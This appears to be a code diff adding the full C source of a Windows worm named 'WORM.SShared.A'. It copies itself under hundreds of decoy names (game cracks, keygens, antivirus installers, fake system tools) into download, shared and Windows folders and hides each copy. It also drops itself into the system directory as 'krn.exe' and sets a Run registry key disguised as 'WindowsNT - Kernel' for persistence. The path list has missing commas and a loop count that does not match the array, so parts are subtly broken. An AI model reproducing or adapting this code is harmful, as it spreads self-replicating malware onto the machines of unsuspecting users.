@@ -1,0 +1,400 @@
+   #include <windows.h>
+   #include <stdio.h>
+
+   HMODULE HMod;
+   HKEY hKey;
+   FILE* w;
+
+   char Worm[MAX_PATH];
+   char SysDir[MAX_PATH];
+
+   char* SpreadTo[] = {
+         "\\My Downloads\\Call of Duty[CRACK].exe",
+         "\\My Downloads\\Keygen.exe",
+         "\\My Downloads\\Battlefield[CRACK].exe",
+         "\\My Downloads\\Battlefield keygen.exe",
+         "\\My Downloads\\Kaspersky 7.0.exe",
+         "\\My Downloads\\Kaspersky 7.0[KEYGEN].exe",
+         "\\My Downloads\\Call of Duty[PC-GAME].exe",
+         "\\My Downloads\\Call of Duty2[CRACK].exe",
+         "\\My Downloads\\Call of Duty[KEYGEN].exe"
+         "\\My Downloads\\Call of Duty2[KEYGEN].exe",
+         "\\My Downloads\\Battlefield2[KEYGEN].exe",
+         "\\My Downloads\\Battlefiled2[CRACK].exe",
+         "\\My Downloads\\NOD32[SETUP].exe",
+         "\\My Downloads\\NOD32[KEYGEN].exe",
+         "\\My Downloads\\BSLite2008.exe",
+         "\\My Downloads\\World of Warcraft[FULL GAME].exe",
+         "\\My Downloads\\World of Warcraft[Downloader].exe",
+         "\\My Downloads\\Diablo2.exe",
+         "\\My Downloads\\Diablo2[KEYGEN].exe",
+         "\\My Downloads\\Diablo2[SERIAL].exe",
+         "\\My Downloads\\Diablo2[Item-Patch].exe",
+         "\\My Downloads\\World of Warcraft[CRACK].exe",
+         "\\My Downloads\\World of Warcraft[KEYGEN].exe",
+         "\\My Downloads\\World of Warcraft[SERIAL].exe",
+         "\\My Downloads\\Max Pane2.exe",
+         "\\My Downloads\\Max Pane2[CRACK].exe",
+         "\\My Downloads\\Max Pane2[KEYGEN].exe",
+         "\\My Downloads\\Max Pane2[SERIAL].exe",
+         "\\My Downloads\\Max Pane2[FULL GAME].exe",
+         "\\My Downloads\\Scarface.exe",
+         "\\My Downloads\\Scarface[CRACK].exe",
+         "\\My Downloads\\Scarface(The World is yours)[CRACK].exe",
+         "\\My Downloads\\Scarface[KEYGEN].exe",
+         "\\My Downloads\\msnmsgr.exe",
+         "\\My Downloads\\avguard.exe",
+         "\\My Downloads\\notepad.exe",
+         "\\My Downloads\\taskmgr.exe",
+         "\\My Downloads\\regedit.exe",
+         "\\My Downloads\\Keygen Generator[2007].exe",
+         "\\My Downloads\\Crack Maker[2007].exe",
+         "\\My Downloads\\Dev-Bloodched C++.exe",
+         "\\My Downloads\\Compiler.exe",
+         "\\My Downloads\\Porn Creator.exe",
+         "\\My Downloads\\Porn-Screensaver.scr",
+         "\\My Downloads\\Porno.scr",
+         "\\My Downloads\\Marihuana.exe",
+         "\\My Downloads\\Drugs.exe",
+         "\\My Downloads\\Cokain.exe",
+         "\\My Downloads\\stupid.exe",
+         "\\My Downloads\\Serial Maker[2007].exe",
+         "\\My Downloads\\xxx.exe",
+         "\\My Downloads\\xXxLovexXx.exe",
+         "\\My Downloads\\MSN-Plus[2007].exe",
+         "\\My Downloads\\MSN-Plus(Live).exe",
+         "\\WINDOWS\\ime\\shared\\Call of Duty[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Keygen.exe",
+         "\\WINDOWS\\ime\\shared\\Battlefield[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Battlefield keygen.exe",
+         "\\WINDOWS\\ime\\shared\\Kaspersky 7.0.exe",
+         "\\WINDOWS\\ime\\shared\\Kaspersky 7.0[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\Call of Duty[PC-GAME].exe",
+         "\\WINDOWS\\ime\\shared\\Call of Duty2[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Call of Duty[KEYGEN].exe"
+         "\\WINDOWS\\ime\\shared\\Call of Duty2[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\Battlefield2[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\Battlefiled2[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\NOD32[SETUP].exe",
+         "\\WINDOWS\\ime\\shared\\NOD32[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\BSLite2008.exe",
+         "\\WINDOWS\\ime\\shared\\World of Warcraft[FULL GAME].exe",
+         "\\WINDOWS\\ime\\shared\\World of Warcraft[Downloader].exe",
+         "\\WINDOWS\\ime\\shared\\Diablo2.exe",
+         "\\WINDOWS\\ime\\shared\\Diablo2[KEYGEN].exe",
+         "\\MWINDOWS\\ime\\shared\\Diablo2[SERIAL].exe",
+         "\\WINDOWS\\ime\\shared\\Diablo2[Item-Patch].exe",
+         "\\WINDOWS\\ime\\shared\\World of Warcraft[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\World of Warcraft[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\World of Warcraft[SERIAL].exe",
+         "\\WINDOWS\\ime\\shared\\Max Pane2.exe",
+         "\\WINDOWS\\ime\\shared\\Max Pane2[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Max Pane2[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\Max Pane2[SERIAL].exe",
+         "\\WINDOWS\\ime\\shared\\Max Pane2[FULL GAME].exe",
+         "\\WINDOWS\\ime\\shared\\Scarface.exe",
+         "\\WINDOWS\\ime\\shared\\Scarface[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Scarface(The World is yours)[CRACK].exe",
+         "\\WINDOWS\\ime\\shared\\Scarface[KEYGEN].exe",
+         "\\WINDOWS\\ime\\shared\\msnmsgr.exe",
+         "\\WINDOWS\\ime\\shared\\avguard.exe",
+         "\\WINDOWS\\ime\\shared\\notepad.exe",
+         "\\WINDOWS\\ime\\shared\\taskmgr.exe",
+         "\\WINDOWS\\ime\\shared\\regedit.exe",
+         "\\WINDOWS\\ime\\shared\\Keygen Generator[2007].exe",
+         "\\WINDOWS\\ime\\shared\\Crack Maker[2007].exe",
+         "\\WINDOWS\\ime\\shared\\Dev-Bloodched C++.exe",
+         "\\WINDOWS\\ime\\shared\\Compiler.exe",
+         "\\WINDOWS\\ime\\shared\\Porn Creator.exe",
+         "\\WINDOWS\\ime\\shared\\Porn-Screensaver.scr",
+         "\\WINDOWS\\ime\\shared\\Porno.scr",
+         "\\WINDOWS\\ime\\shared\\Marihuana.exe",
+         "\\WINDOWS\\ime\\shared\\Drugs.exe",
+         "\\WINDOWS\\ime\\shared\\Cokain.exe",
+         "\\WINDOWS\\ime\\shared\\stupid.exe",
+         "\\WINDOWS\\ime\\shared\\Serial Maker[2007].exe",
+         "\\WINDOWS\\ime\\shared\\xxx.exe",
+         "\\WINDOWS\\ime\\shared\\xXxLovexXx.exe",
+         "\\WINDOWS\\ime\\shared\\MSN-Plus[2007].exe",
+         "\\WINDOWS\\ime\\shared\\MSN-Plus(Live).exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Call of Duty[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Keygen.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Battlefield[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Battlefield keygen.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Kaspersky 7.0.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Kaspersky 7.0[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Call of Duty[PC-GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Call of Duty2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Call of Duty[KEYGEN].exe"
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Call of Duty2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Battlefield2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Battlefiled2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\NOD32[SETUP].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\NOD32[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\BSLite2008.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\World of Warcraft[FULL GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\World of Warcraft[Downloader].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Diablo2.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Diablo2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Diablo2[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Diablo2[Item-Patch].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\World of Warcraft[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\World of Warcraft[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\World of Warcraft[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Max Pane2.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Max Pane2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Max Pane2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Max Pane2[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Max Pane2[FULL GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Scarface.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Scarface[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Scarface(The World is yours)[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Scarface[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\msnmsgr.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\avguard.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\notepad.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\taskmgr.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\regedit.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Keygen Generator[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Crack Maker[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Dev-Bloodched C++.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Compiler.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Porn Creator.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Porn-Screensaver.scr",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Porno.scr",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Marihuana.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Drugs.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Cokain.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\stupid.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\Serial Maker[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\xxx.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\xXxLovexXx.exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\MSN-Plus[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\Download\\MSN-Plus(Live).exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Call of Duty[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Keygen.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Battlefield[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Battlefield keygen.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Kaspersky 7.0.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Kaspersky 7.0[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Call of Duty[PC-GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Call of Duty2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Call of Duty[KEYGEN].exe"
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Call of Duty2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Battlefield2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Battlefiled2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\NOD32[SETUP].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\NOD32[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\BSLite2008.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\World of Warcraft[FULL GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\World of Warcraft[Downloader].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Diablo2.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Diablo2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Diablo2[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Diablo2[Item-Patch].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\World of Warcraft[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\World of Warcraft[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\World of Warcraft[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Max Pane2.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Max Pane2[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Max Pane2[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Max Pane2[SERIAL].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Max Pane2[FULL GAME].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Scarface.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Scarface[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Scarface(The World is yours)[CRACK].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Scarface[KEYGEN].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\msnmsgr.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\avguard.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\notepad.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\taskmgr.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\regedit.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Keygen Generator[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Crack Maker[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Dev-Bloodched C++.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Compiler.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Porn Creator.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Porn-Screensaver.scr",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Porno.scr",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Marihuana.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Drugs.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Cokain.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\stupid.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\Serial Maker[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\xxx.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\xXxLovexXx.exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\MSN-Plus[2007].exe",
+         "\\WINDOWS\\SoftwareDistribution\\AuthCabs\\Downloaded\\MSN-Plus(Live).exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Call of Duty[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Keygen.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Battlefield[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Battlefield keygen.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Kaspersky 7.0.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Kaspersky 7.0[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Call of Duty[PC-GAME].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Call of Duty2[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Call of Duty[KEYGEN].exe"
+         "\\DOCUME~1\\Administrator\\Shared\\Call of Duty2[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Battlefield2[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Battlefiled2[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\NOD32[SETUP].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\NOD32[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\BSLite2008.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\World of Warcraft[FULL GAME].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\World of Warcraft[Downloader].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Diablo2.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Diablo2[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Diablo2[SERIAL].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Diablo2[Item-Patch].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\World of Warcraft[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\World of Warcraft[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\World of Warcraft[SERIAL].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Max Pane2.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Max Pane2[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Max Pane2[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Max Pane2[SERIAL].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Max Pane2[FULL GAME].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Scarface.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Scarface[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Scarface(The World is yours)[CRACK].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Scarface[KEYGEN].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\msnmsgr.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\avguard.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\notepad.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\taskmgr.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\regedit.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Keygen Generator[2007].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Crack Maker[2007].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Dev-Bloodched C++.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Compiler.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Porn Creator.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Porn-Screensaver.scr",
+         "\\DOCUME~1\\Administrator\\Shared\\Porno.scr",
+         "\\DOCUME~1\\Administrator\\Shared\\Marihuana.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Drugs.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Cokain.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\stupid.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\Serial Maker[2007].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\xxx.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\xXxLovexXx.exe",
+         "\\DOCUME~1\\Administrator\\Shared\\MSN-Plus[2007].exe",
+         "\\DOCUME~1\\Administrator\\Shared\\MSN-Plus(Live).exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Call of Duty[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Keygen.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Battlefield[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Battlefield keygen.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Kaspersky 7.0.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Kaspersky 7.0[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Call of Duty[PC-GAME].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Call of Duty2[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Call of Duty[KEYGEN].exe"
+         "\\DOKUME~1\\Administrator\\Shared\\Call of Duty2[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Battlefield2[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Battlefiled2[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\NOD32[SETUP].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\NOD32[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\BSLite2008.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\World of Warcraft[FULL GAME].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\World of Warcraft[Downloader].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Diablo2.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Diablo2[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Diablo2[SERIAL].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Diablo2[Item-Patch].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\World of Warcraft[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\World of Warcraft[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\World of Warcraft[SERIAL].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Max Pane2.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Max Pane2[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Max Pane2[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Max Pane2[SERIAL].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Max Pane2[FULL GAME].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Scarface.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Scarface[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Scarface(The World is yours)[CRACK].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Scarface[KEYGEN].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\msnmsgr.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\avguard.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\notepad.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\taskmgr.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\regedit.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Keygen Generator[2007].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Crack Maker[2007].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Dev-Bloodched C++.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Compiler.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Porn Creator.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Porn-Screensaver.scr",
+         "\\DOKUME~1\\Administrator\\Shared\\Porno.scr",
+         "\\DOKUME~1\\Administrator\\Shared\\Marihuana.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Drugs.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Cokain.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\stupid.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\Serial Maker[2007].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\xxx.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\xXxLovexXx.exe",
+         "\\DOKUME~1\\Administrator\\Shared\\MSN-Plus[2007].exe",
+         "\\DOKUME~1\\Administrator\\Shared\\MSN-Plus(Live).exe",
+         };
+
+   DWORD WINAPI Spread(LPVOID)
+   {
+         HMod = GetModuleHandle(NULL);
+         GetModuleFileName(HMod, Worm, sizeof(Worm));
+
+         while(1)
+         {
+         for(int i = 0; i < 320; i++)
+         {
+         CopyFile(Worm, SpreadTo[i], 0);
+         SetFileAttributes(SpreadTo[i], FILE_ATTRIBUTE_HIDDEN);
+         }
+         Sleep(300000); // wait 5 minutes
+         }
+
+   }
+
+   int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
+   {
+       CreateThread(NULL, 0, Spread, 0, 0, NULL);
+
+       HMod = GetModuleHandle(NULL);
+       GetModuleFileName(HMod, Worm, sizeof(Worm));
+       GetSystemDirectory(SysDir, sizeof(SysDir));
+
+       strcat(SysDir, "\\krn.exe");
+
+       int Drop = CopyFile(Worm, SysDir, 0);
+
+       if(Drop == ERROR)
+       {
+       GetSystemDirectory(SysDir, sizeof(SysDir));
+       strcat(SysDir, "\\rundll32.scr");
+       CopyFile(Worm, SysDir, 0);
+       }
+
+       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+       {
+       if(RegSetValueEx(hKey, "WindowsNT - Kernel", 0, REG_SZ, (const unsigned char*)SysDir, sizeof(SysDir)) == ERROR)
+       {
+       RegSetValueEx(hKey, "WindowsNT-Kernel", 0, REG_SZ, (const unsigned char*)SysDir, sizeof(SysDir));
+       }
+       RegCloseKey(hKey);
+       }
+
+       w = fopen("WORM.SShared.A.bat", "w");
+       fwrite("@echo off\necho Hello !\n\necho My name is WORM.SShared.A,\necho i am a very friendly worm\necho I just want to harm your Computer a bit.\necho bye !\npause\ndel %0",
+       157,
+       1,
+       w
+       );
+       fclose(w);
+
+       ShellExecute(NULL, NULL, "WORM.SShared.A.bat", NULL, NULL, SW_MAXIMIZE);
+
+       /* PayLoad */
+
+       while(1)
+       {
+       Sleep(10);
+       }
+
+   }
